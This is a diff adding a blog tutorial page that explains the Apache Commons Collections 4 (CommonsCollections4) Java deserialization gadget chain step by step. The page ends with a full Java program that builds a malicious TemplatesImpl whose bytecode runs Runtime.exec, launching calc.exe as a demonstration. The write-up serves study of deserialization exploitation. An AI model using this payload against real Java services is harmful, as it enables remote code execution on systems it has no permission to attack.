@@ -1,0 +1,244 @@
+---
+layout: default
+---
+<html>
+<body>
+<h1>CommonsCollection4</h1>
+
+<p>
+    Just Like CommonsCollection1 and CommonsCollection3 , CommonsCollections2 and CommonCollection4 are exactly same apart from few changes.
+</p>
+<p>
+    Instead of Simply Using the InvokerTransFormer we are using a chain of ConstantTransFormer and InstantiateTransFormer and passing it to the TransFormingComparator.<br>
+    Rest All remains Same
+</p>
+<p>So lets jump into the payload directly and understand how it works</p>
+<p>Since we have understood how instantiateTransformer works in CommonsCollection3 , we will just cover it up with regards to the PriorityQueue</p>
+<P>If you are not aware about the InstantiateTransFormer, i would advise you to take a lok into the CommonsCollection2</P>
+
+<p>So that being Said , below is how the payload looks like</p>
+<p>
+    <pre>
+        Object templates = Gadgets.createTemplatesImpl(command); //1
+
+		ConstantTransformer constant = new ConstantTransformer(String.class); //2
+
+		// 3
+		Class[] paramTypes = new Class[] { String.class };
+		Object[] args = new Object[] { "foo" };
+		InstantiateTransformer instantiate = new InstantiateTransformer(
+				paramTypes, args);
+
+		// 4
+		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
+		args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
+
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+
+		// 5
+		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+		queue.add(1);
+		queue.add(1);
+
+		// 6
+		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
+		paramTypes[0] = Templates.class;
+		args[0] = templates;
+
+		return queue;
+    </pre>
+</p>
+<p>
+Instead of InvokerTransformer, InstantiateTransformer is being used,
+<br>
+As we know the instantiateTransformer takes a class and Initiates it with the args passed by us.
+Why do we use TraxFilter.class and other are already dicussed in CC3.
+<br>
+So lets focus on what the above code does.
+<br>
+At [1] the code instntiates a ConstantTransformer with String.class, Once the ConstantTransformer is instantiated it can not be changed(Without the use of reflection).
+So the constant returns String.class.
+</p>
+<p>
+At line [3] the params for the InstantiateTransformer's constructor is being created and then it will be passed to it.
+<br>
+The reason we have takes String.class and Foo is because we have initiated the ConstantTransformer with String.class and as we know the InstantiateTransformer needs a class where it will check for a constructor that takes an argument of first_argument type of InstantiateTransformer and it will pass the value as the second_argument of InstantiateTransformer.
+<br>
+SO in String.class we have constructors that takes input of type String and we will pass foo as the value.
+<br>
+<br>
+
+Now at [4] we are getting the Field reference value of iParamTypes and iArgs out of instantiateTransformer that we can further replace with our own value,
+<br>
+At [5] we are initiating the priorityQueue and passing the TransFormingComparator wth chainedTransFormer as the transformer.
+and then we are adding elemets into the priorityQueue, these elements are basiccally the obj1 and obj2 that we see in the TransFormingCompartor's compare function.
+<br>
+And at [6] we are changing the String.class of ConstantTransformer to TraXFilter.class
+</p>
+<p>
+Now if we put all the above together.
+<br>
+<pre>
+- Instantiate the ConstantTransformer with TraXfilter.class
+- Instantiate  the InstantiateTransformer with Templates.class and the value as templates(That we obtained from step 1)
+- Create the chained TransFormer with Constant and Instantiate Transformer
+- Instantiate the Priority Queue with the TrnasformingComparator with ChainedTransFormer as the transformer
+- Add any random value into priority Queue
+</pre>
+<br>
+So the whole above code can look like below
+</p>
+<p>
+    <pre>
+Object templates = Gadgets.createTemplatesImpl(command);
+ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
+Class[] paramTypes = new Class[] { Templates.class };
+Object[] argst = new Object[] { templates };
+InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
+ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+queue.add(1);
+queue.add(1);
+    </pre>
+</p>
+<p>Question:<br>
+    How are we adding  1 into priority Queue but still achieving Code Execution?</p>
+    <p>
+        Answer:<br>
+        So whatever we add into the priorityQueue as queue.add never gets used.
+<br>
+So From the priorityQueue the code flows to the transFormingCompartor.compare().
+<br>
+Here the obj1 and obj2 are the values we pass via queue.add()
+<br>
+Now in the transformer.apply() , here the transformer is ChainedTransFormer, and if you see the chainedTrasformer's transform Code
+    </p>
+    <p>
+        <pre>
+            @Override
+            public T transform(T object) {
+                for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
+                    object = iTransformer.apply(object);
+                }
+                return object;
+            }
+        </pre>
+    </p>
+<p>
+    So it iterates over the list , inout case its ConstantTransformer and InstantiateTransformer and calls the transForm() on them.
+<pre>
+- once we Instantiate ConstantTransformer () no matter what we pass to the transform() it will alwasy return the instantied Value and in our case it will be TraXFilter.class
+- For the InstantiateTransformer , the Object Passed from the queue.add has alredybeen overwritten from the output of ConstantTransformer due to the Below code
+</pre>
+</p>
+<p>
+    <pre>
+        object = iTransformer.apply(object);
+    </pre>
+</p>
+<p>
+    And hence even if we are passing 1 from queue.add() for InstantiateTransformer () it sees the TraXfilter.class<br>
+That is why it doesn't matter if we pass 1 or 2 or any other string.(Keep in mind that we can pass anything we want since we are suing the PriorityQueue of ObjectType, you will be restcited to the type of PriorityQueue that you initiate)
+</p>
+<p>
+    So we can modify the code and the code along with TemplatesImpl creation for CommonsCollection4 gadget will look like below.
+</p>
+<p>
+    <pre>
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import java.lang.reflect.Field;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.util.PriorityQueue;
+import javax.xml.transform.Templates;
+import org.apache.commons.collections4.functors.*;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+public class cc4 {
+    public static void main(String[] args) throws Exception {
+        String command="calc.exe";
+        ClassPool pool = ClassPool.getDefault();
+
+        /*
+         * So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call
+         * clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName());
+            clazz.setSuperclass(superC);
+
+            Reason for calling the above 2 are.
+            1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
+            AbstractTranslet.class or else TemplatesIMPL will not execute it(Figure out why)
+         */
+
+
+        final CtClass clazz = pool.get(cc4.class.getName()); 
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            command.replace("\\", "\\\\").replace("\"", "\\\"") +
+            "\");";
+        clazz.makeClassInitializer().insertAfter(cmd);
+        CtClass superC = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superC);
+        final byte[] classBytes = clazz.toBytecode();
+
+
+
+        byte[] maliciousBytecode =classBytes;
+    
+
+        /*
+         * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
+         * _tfactory , as these are necessary fields.
+         * Why can't we use the normal getters and setters(FigureOut)
+         */
+        TemplatesImpl templates = new TemplatesImpl();
+
+    
+        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates, new byte[][]{maliciousBytecode});
+
+       
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "Exploit");
+        
+        Field tfacname = TemplatesImpl.class.getDeclaredField("_tfactory");
+        tfacname.setAccessible(true);
+        tfacname.set(templates, TransformerFactoryImpl.class.newInstance());
+
+        //templates.newTransformer();
+
+         
+        ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
+		Class[] paramTypes = new Class[] { Templates.class };
+		Object[] argst = new Object[] { templates };
+		InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+		queue.add(1);
+		queue.add(1);
+        
+    }
+}
+    </pre>
+</p>
+
+<p>
+    <img src="images/cc/cc4popup.PNG">
+</p>
+
+<p>
+    This is how the CommonsCollection4 Payload works, staring from the EntryPoint to Code Execution
+</p>
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
